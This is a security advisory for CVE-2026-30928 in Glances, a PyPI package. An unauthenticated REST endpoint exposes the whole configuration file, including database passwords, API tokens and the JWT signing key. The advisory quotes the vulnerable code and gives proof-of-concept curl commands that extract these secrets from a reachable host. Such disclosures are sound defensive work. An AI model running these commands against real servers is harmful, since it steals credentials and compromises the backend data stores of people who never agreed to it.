# [H] Glances Exposes Unauthenticated Configuration Secrets

## Summary
Severity: High
Advisory: GHSA-gh4x-f7cq-wwx6
CVE: CVE-2026-30928
CWE: CWE-200
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-09
Source: https://github.com/advisories/GHSA-gh4x-f7cq-wwx6
Type: github-advisory

## Affected
- PyPI: `Glances` — affected >=0 <4.5.1

## Details
### Summary
The /api/4/config REST API endpoint returns the entire parsed Glances configuration file (glances.conf) via self.config.as_dict() with no filtering of sensitive values. The configuration file contains credentials for all configured backend services including database passwords, API tokens, JWT signing keys, and SSL key passwords.

### Details
Root Cause: The as_dict() method in config.py iterates over every section and every key in the ConfigParser and returns them all as a flat dictionary. No sensitive key filtering or redaction is applied.

Affected Code:
- _File: glances/outputs/glances_restful_api.py, lines 1154-1167_
```
def _api_config(self):
    """Glances API RESTful implementation.

    Return the JSON representation of the Glances configuration file
    HTTP/200 if OK
    HTTP/404 if others error
    """
    try:
        # Get the RAW value of the config' dict
        args_json = self.config.as_dict()  # <-- Returns ALL config including secrets
    except Exception as e:
        raise HTTPException(status.HTTP_404_NOT_FOUND, f"Cannot get config ({str(e)})")
    else:
        return GlancesJSONResponse(args_json)
```

- _File: glances/config.py, lines 280-287_
```
def as_dict(self):
    """Return the configuration as a dict"""
    dictionary = {}
    for section in self.parser.sections():
        dictionary[section] = {}
        for option in self.parser.options(section):
            dictionary[section][option] = self.parser.get(section, option)  # No filtering
    return dictionary
```
- _File: glances/outputs/glances_restful_api.py, lines 472-475 (authentication bypass)_
```
if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)  # No authentication!
```
### PoC
- Start Glances in default webserver mode:
```
glances -w
# Glances web server started on http://0.0.0.0:61208/
```
- From any network-reachable host, retrieve all configuration secrets:
```
# Get entire config including all credentials
curl http://target:61208/api/4/config
```
Step 3: Extract specific secrets:
```
# Get JWT secret key for token forgery
curl http://target:61208/api/4/config/outputs/jwt_secret_key

# Get InfluxDB token
curl http://target:61208/api/4/config/influxdb2/token

# Get all stored server passwords
curl http://target:61208/api/4/config/passwords
```
### Impact
Full Infrastructure Compromise: Database credentials (InfluxDB, MongoDB, PostgreSQL/TimescaleDB, CouchDB, Cassandra) allow direct access to all connected backend data stores.

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-gh4x-f7cq-wwx6
- https://nvd.nist.gov/vuln/detail/CVE-2026-30928
- https://github.com/nicolargo/glances/commit/306a7136154ba5c1531489c99f8306d84eae37da
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.1
